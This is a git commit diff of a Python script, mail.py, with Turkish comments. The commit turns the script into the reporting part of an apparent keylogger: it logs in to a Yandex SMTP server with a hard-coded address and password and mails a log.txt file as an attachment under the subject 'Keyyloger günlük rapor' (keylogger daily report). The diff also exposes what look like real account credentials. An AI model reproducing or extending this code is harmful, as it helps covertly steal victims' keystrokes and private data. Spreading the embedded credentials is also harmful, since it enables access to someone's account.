74c919fd80378a19ad914e9fd3fdc724645fcfe9
Abdulkadir Yeşilkaya <abdulkadir7725@gmail.com>
2023-02-23 21:35:40 +0300

    mail ile dosya gönderme işlemi tamalandı

--- mail.py
+++ mail.py
@@ -1,14 +1,25 @@
 import smtplib
-
-
-subject = "Proje Geliştirmek"
-message = "Pythonu seviyorum"
-content = "Subject: {0} \n {1}".format(subject,message)
+from email.message import EmailMessage
 
 mail = smtplib.SMTP("smtp.yandex.ru",587)
 mail.ehlo()
 mail.starttls()
 mail.login("greenrock2516@yandex.com","1265913226")
-mail.sendmail("greenrock2516@yandex.com","greenrock2516@yandex.com",content.encode("utf-8"))
+
+message = EmailMessage()
+message['From'] = 'Py11 <greenrock2516@yandex.com>'
+message['To'] = 'Alıcı <greenrock2516@yandex.com>'
+message['Subject'] = 'Keyyloger günlük rapor'
+
+# Dosyayı ekleyin
+with open('log.txt', 'rb') as f:
+    file_data = f.read()
+    file_name = f.name
+
+message.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
+
+mail.send_message(message)
+
+mail.quit()
 
 print("mesaj gönderildi")
